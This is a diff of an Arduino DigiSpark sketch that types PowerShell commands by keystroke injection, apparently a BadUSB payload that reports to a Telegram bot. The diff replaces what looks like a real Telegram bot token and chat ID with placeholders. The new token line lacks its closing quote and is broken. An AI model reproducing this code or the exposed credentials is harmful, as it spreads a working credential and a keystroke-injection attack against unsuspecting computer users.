@@ -8,11 +8,11 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(4000);
 
-  DigiKeyboard.print("$env:TK='8464883369:AAH8am3Lj8inaWk2nFbqC5BC4CsGIZnkJZw'");
+  DigiKeyboard.print("$env:TK='APIToken");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(400);
 
-  DigiKeyboard.print("$env:CI='5122031226'");
+  DigiKeyboard.print("$env:CI='chartID'");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(400);
 
